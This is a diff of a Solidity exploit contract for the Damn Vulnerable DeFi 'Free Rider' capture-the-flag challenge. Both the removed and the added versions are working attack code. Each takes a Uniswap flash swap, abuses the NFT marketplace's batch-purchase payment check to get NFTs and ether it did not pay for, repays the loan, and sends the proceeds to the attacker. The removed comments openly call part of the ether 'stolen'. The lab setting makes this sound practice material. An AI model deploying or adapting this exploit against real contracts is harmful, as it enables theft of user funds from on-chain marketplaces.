@@ -1,62 +1,34 @@
-// SPDX-License-Identifier: MIT
+//SDPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "../DamnValuableToken.sol";
+import "../DamnValuableNFT.sol";
 import "../free-rider/FreeRiderBuyer.sol";
-
-interface IUniswapV2Pair {
-    function swap(
-        uint amount0Out,
-        uint amount1Out,
-        address to,
-        bytes calldata data
-    ) external;
-}
-
-interface IUniswapV2Callee {
-    function uniswapV2Call(
-        address sender,
-        uint amount0,
-        uint amount1,
-        bytes calldata data
-    ) external;
-}
-
-interface IFreeRiderNFTMarketplace {
-    function offerMany(
-        uint256[] calldata tokenIds,
-        uint256[] calldata prices
-    ) external;
-
-    function buyMany(uint256[] calldata tokenIds) external payable;
-
-    function token() external returns (IERC721);
-}
-
-interface IWETH {
-    function transfer(
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
-
-    function deposit() external payable;
-
-    function withdraw(uint256 amount) external;
-}
+import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
 
 contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
     address immutable attacker;
     IUniswapV2Pair immutable uniswapPair;
-    IFreeRiderNFTMarketplace immutable nftMarketplace;
+    FreeRiderNFTMarketplace immutable nftMarketplace;
     IWETH immutable weth;
     IERC721 immutable nft;
     address freeRiderBuyer;
+    uint8 immutable amountOfNFT;
+    uint256 immutable nftPrice;
 
     constructor(
         IUniswapV2Pair _uniswapPair,
-        IFreeRiderNFTMarketplace _nftMarketplace,
+        FreeRiderNFTMarketplace _nftMarketplace,
         IWETH _weth,
-        address _freeRiderBuyer
+        address _freeRiderBuyer,
+        uint8 _amountOfNFT,
+        uint256 _nftPrice
     ) {
         attacker = msg.sender;
         uniswapPair = _uniswapPair;
@@ -64,62 +36,57 @@ contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver {
         weth = _weth;
         nft = _nftMarketplace.token();
         freeRiderBuyer = _freeRiderBuyer;
+        amountOfNFT = _amountOfNFT;
+        nftPrice = _nftPrice;
     }
 
-    // 1. Trigger flash swap.
-    function pwn() external {
-        uniswapPair.swap(120 ether, 0, address(this), hex"00");
+    //TODO: 1 flashloan for 15 weth
+    function attack() external {
+        // need to pass some data to trigger uniswapV2Call
+        // borrow 15 ether of WETH
+        bytes memory data = abi.encode(uniswapPair.token0(), nftPrice);
+        uniswapPair.swap(nftPrice, 0, address(this), data);
     }
 
-    // 2. Uniswap callback after receiving flash swap.
+    // 2. uniswap weth to eth
     function uniswapV2Call(
         address,
         uint,
         uint,
-        bytes calldata
+        bytes calldata _data
     ) external override {
-        weth.withdraw(120 ether);
+        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));
 
-        // 3. Buy 2 NFTs for 15 ether each.
-        uint256[] memory tokenIds = new uint256[](2);
-        tokenIds[0] = 0;
-        tokenIds[1] = 1;
-        nftMarketplace.buyMany{value: 30 ether}(tokenIds);
+        // computing for 0.3% fee
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
 
-        // 4. Put them back on sale for 90 ether each.
-        nft.setApprovalForAll(address(nftMarketplace), true);
-        uint256[] memory prices = new uint256[](2);
-        prices[0] = 90 ether;
-        prices[1] = 90 ether;
-        nftMarketplace.offerMany(tokenIds, prices);
+        // unwrap WETH
+        weth.withdraw(amount);
 
-        // 5. Buy them both but only send 90 ether, the other 90 will be drained from the market's own balance.
-        nftMarketplace.buyMany{value: 90 ether}(tokenIds);
+        // 3. buy all the NFT from marketplace
+        uint256[] memory tokenIds = new uint256[](amountOfNFT);
+        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
+        }
+        nftMarketplace.buyMany{value: nftPrice}(tokenIds);
 
-        // 7. Buy remaining 4 NFTs with 60 ether we gained.
-        tokenIds = new uint256[](4);
-        tokenIds[0] = 2;
-        tokenIds[1] = 3;
-        tokenIds[2] = 4;
-        tokenIds[3] = 5;
-        nftMarketplace.buyMany{value: 60 ether}(tokenIds);
-
-        // 8. Send all 6 NFTs to buyer's contract.
-        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
+        // send all of the nft to the FreeRiderBuyer contract
+        for (uint256 tokenId = 0; tokenId < amountOfNFT; tokenId++) {
+            tokenIds[tokenId] = tokenId;
             nft.safeTransferFrom(address(this), freeRiderBuyer, tokenId);
         }
 
-        // 10. Calculate fee and pay back loan.
-        uint256 fee = ((120 ether * 3) / uint256(997)) + 1;
-        weth.deposit{value: 120 ether + fee}();
-        weth.transfer(address(uniswapPair), 120 ether + fee);
+        // wrap enough WETH9 to repay our debt
+        weth.deposit{value: amountToRepay}();
 
-        // 11. Transfer spoils to attacker's EOA.
-        payable(address(attacker)).transfer(address(this).balance);
+        // 5. repay loan to uniswap
+        weth.transfer(address(uniswapPair), amountToRepay);
+
+        // selfdestruct to the owner
+        selfdestruct(payable(attacker));
     }
 
-    // 6. We'll receive 180 ether as the seller of NFTs, half from our selves, other half stolen.
-    // 9. We receive our 45 ether reward after we sent the last NFT to the buyer's contract.
     receive() external payable {}
 
     function onERC721Received(
